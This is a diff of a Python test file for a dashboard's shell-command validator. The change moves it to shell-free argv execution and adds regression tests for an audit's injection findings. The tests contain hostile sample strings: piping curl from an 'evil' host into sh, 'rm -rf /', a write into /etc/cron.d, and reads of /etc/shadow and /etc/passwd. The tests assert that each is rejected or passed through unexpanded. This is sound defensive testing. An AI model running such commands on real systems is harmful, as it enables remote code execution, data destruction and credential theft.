@@ -9,92 +9,63 @@ import pytest
 
 from seam_runtime.dashboard import (
     ALLOWED_SHELL_COMMANDS,
-    ALLOWED_SHELL_PATHS,
     BLOCKED_SHELL_COMMANDS,
     _get_shell_timeout,
     _validate_shell_command,
     _validate_shell_cwd,
-    _validate_shell_executable,
 )
 
 
-class TestValidateShellExecutable:
-    def test_valid_bash(self):
-        assert _validate_shell_executable("/bin/bash") in ALLOWED_SHELL_PATHS
-
-    def test_valid_sh(self):
-        assert _validate_shell_executable("/bin/sh") in ALLOWED_SHELL_PATHS
-
-    def test_valid_zsh(self):
-        assert _validate_shell_executable("/bin/zsh") in ALLOWED_SHELL_PATHS
-
-    def test_valid_usr_bin_bash(self):
-        assert _validate_shell_executable("/usr/bin/bash") in ALLOWED_SHELL_PATHS
-
-    def test_valid_usr_bin_zsh(self):
-        assert _validate_shell_executable("/usr/bin/zsh") in ALLOWED_SHELL_PATHS
-
-    def test_invalid_shell_rejected(self):
-        with pytest.raises(PermissionError, match="not in allowed set"):
-            _validate_shell_executable("/usr/bin/python3")
-
-    def test_invalid_shell_fish_rejected(self):
-        with pytest.raises(PermissionError, match="not in allowed set"):
-            _validate_shell_executable("/usr/bin/fish")
-
-    def test_relative_path_rejected(self):
-        with pytest.raises(PermissionError, match="not in allowed set"):
-            _validate_shell_executable("bash")
-
-
 class TestValidateShellCommand:
+    """_validate_shell_command returns the validated argv to run shell-free."""
+
     def test_allowed_ls(self):
-        assert _validate_shell_command("ls -la") == "ls"
+        assert _validate_shell_command("ls -la") == ["ls", "-la"]
 
     def test_allowed_cat(self):
-        assert _validate_shell_command("cat /etc/hosts") == "cat"
+        assert _validate_shell_command("cat /etc/hosts") == ["cat", "/etc/hosts"]
 
     def test_allowed_grep(self):
-        assert _validate_shell_command("grep -r pattern .") == "grep"
+        assert _validate_shell_command("grep -r pattern .") == ["grep", "-r", "pattern", "."]
 
     def test_allowed_find(self):
-        assert _validate_shell_command("find . -name '*.py'") == "find"
+        assert _validate_shell_command("find . -name '*.py'") == ["find", ".", "-name", "*.py"]
 
     def test_allowed_pwd(self):
-        assert _validate_shell_command("pwd") == "pwd"
+        assert _validate_shell_command("pwd") == ["pwd"]
 
     def test_allowed_date(self):
-        assert _validate_shell_command("date") == "date"
+        assert _validate_shell_command("date") == ["date"]
 
     def test_allowed_whoami(self):
-        assert _validate_shell_command("whoami") == "whoami"
+        assert _validate_shell_command("whoami") == ["whoami"]
 
     def test_allowed_echo(self):
-        assert _validate_shell_command("echo hello") == "echo"
+        assert _validate_shell_command("echo hello") == ["echo", "hello"]
 
     def test_allowed_head(self):
-        assert _validate_shell_command("head -n 10 file.txt") == "head"
+        assert _validate_shell_command("head -n 10 file.txt") == ["head", "-n", "10", "file.txt"]
 
     def test_allowed_tail(self):
-        assert _validate_shell_command("tail -n 10 file.txt") == "tail"
+        assert _validate_shell_command("tail -n 10 file.txt") == ["tail", "-n", "10", "file.txt"]
 
     def test_allowed_wc(self):
-        assert _validate_shell_command("wc -l file.txt") == "wc"
+        assert _validate_shell_command("wc -l file.txt") == ["wc", "-l", "file.txt"]
 
     def test_allowed_sort(self):
-        assert _validate_shell_command("sort file.txt") == "sort"
+        assert _validate_shell_command("sort file.txt") == ["sort", "file.txt"]
 
     def test_allowed_uniq(self):
-        assert _validate_shell_command("uniq file.txt") == "uniq"
+        assert _validate_shell_command("uniq file.txt") == ["uniq", "file.txt"]
 
     def test_allowed_cut(self):
-        assert _validate_shell_command("cut -d: -f1 /etc/passwd") == "cut"
+        assert _validate_shell_command("cut -d: -f1 /etc/passwd") == ["cut", "-d:", "-f1", "/etc/passwd"]
 
     def test_allowed_awk(self):
-        assert _validate_shell_command("awk '{print $1}' file.txt") == "awk"
+        assert _validate_shell_command("awk '{print $1}' file.txt") == ["awk", "{print $1}", "file.txt"]
 
     def test_allowed_sed(self):
-        assert _validate_shell_command("sed 's/foo/bar/g' file.txt") == "sed"
+        assert _validate_shell_command("sed 's/foo/bar/g' file.txt") == ["sed", "s/foo/bar/g", "file.txt"]
 
     def test_blocked_rm(self):
         with pytest.raises(PermissionError, match="blocked set"):
@@ -172,12 +143,48 @@ class TestValidateShellCommand:
         with pytest.raises(PermissionError, match="Empty shell command"):
             _validate_shell_command("   ")
 
-    def test_command_with_path_extracts_basename(self):
-        assert _validate_shell_command("/bin/ls -la") == "ls"
+    def test_command_with_path_validates_basename(self):
+        # The allowlist check uses the basename, but the executed argv keeps
+        # the explicit path the operator typed.
+        assert _validate_shell_command("/bin/ls -la") == ["/bin/ls", "-la"]
 
     def test_malformed_command_rejected(self):
         with pytest.raises(PermissionError, match="Cannot parse"):
             _validate_shell_command("echo 'unclosed quote")
+
+
+class TestShellInjectionRejected:
+    """Audit S1 PoC payloads: chaining/redirection/substitution can't escape.
+
+    Security comes from shell-free execution (shell=False); the spaced-operator
+    payloads also get a clean up-front rejection.
+    """
+
+    def test_command_chaining_rejected(self):
+        with pytest.raises(PermissionError, match="operator"):
+            _validate_shell_command("ls && curl http://evil | sh")
+
+    def test_redirection_to_system_path_rejected(self):
+        with pytest.raises(PermissionError, match="operator"):
+            _validate_shell_command("echo hi > /etc/cron.d/x")
+
+    def test_semicolon_chaining_rejected(self):
+        with pytest.raises(PermissionError, match="operator"):
+            _validate_shell_command("ls ; rm -rf /")
+
+    def test_pipe_token_rejected(self):
+        with pytest.raises(PermissionError, match="operator"):
+            _validate_shell_command("cat /etc/passwd | grep root")
+
+    def test_command_substitution_runs_as_literal_args(self):
+        # No spaced operator token, so validation accepts it — but because it
+        # runs shell-free, "$(cat /etc/shadow)" is passed verbatim as literal
+        # argv and never substituted. Proven by the integration test below.
+        assert _validate_shell_command("echo $(cat /etc/shadow)") == [
+            "echo",
+            "$(cat",
+            "/etc/shadow)",
+        ]
 
 
 class TestValidateShellCwd:
@@ -272,9 +279,15 @@ class TestShellIntegration:
             with pytest.raises(PermissionError, match="disabled by default"):
                 TextualDashboardApp._run_shell_subprocess(mock_self, "echo hello")
 
-    def test_invalid_shell_rejected(self, monkeypatch, tmp_path):
+    def test_command_substitution_not_expanded(self, monkeypatch, tmp_path):
+        # Audit S1 regression: shell-free execution means $(...) is a literal
+        # argument, never a subshell. Output echoes the text; no file is read.
         monkeypatch.setenv("SEAM_DASHBOARD_ALLOW_SHELL", "1")
-        monkeypatch.setenv("SHELL", "/usr/bin/python3")
+        monkeypatch.setenv("SHELL", "/bin/bash")
+        monkeypatch.setenv("SEAM_SHELL_TIMEOUT_SECONDS", "5")
+
+        secret = tmp_path / "secret.txt"
+        secret.write_text("TOP_SECRET_VALUE", encoding="utf-8")
 
         mock_self = MagicMock()
         mock_self.shell_cwd = tmp_path
@@ -282,8 +295,12 @@ class TestShellIntegration:
         from seam_runtime.dashboard import TextualDashboardApp
 
         if hasattr(TextualDashboardApp, "_run_shell_subprocess"):
-            with pytest.raises(PermissionError, match="not in allowed set"):
-                TextualDashboardApp._run_shell_subprocess(mock_self, "echo hello")
+            result = TextualDashboardApp._run_shell_subprocess(
+                mock_self, f"echo $(cat {secret})"
+            )
+            assert result.returncode == 0
+            assert "$(cat" in result.stdout
+            assert "TOP_SECRET_VALUE" not in result.stdout
 
     def test_cwd_outside_allowed_path_rejected(self, monkeypatch):
         monkeypatch.setenv("SEAM_DASHBOARD_ALLOW_SHELL", "1")
@@ -319,9 +336,6 @@ class TestConstants:
 
     def test_blocked_commands_is_frozenset(self):
         assert isinstance(BLOCKED_SHELL_COMMANDS, frozenset)
-
-    def test_allowed_paths_is_frozenset(self):
-        assert isinstance(ALLOWED_SHELL_PATHS, frozenset)
 
     def test_no_overlap_between_allowed_and_blocked(self):
         overlap = ALLOWED_SHELL_COMMANDS & BLOCKED_SHELL_COMMANDS
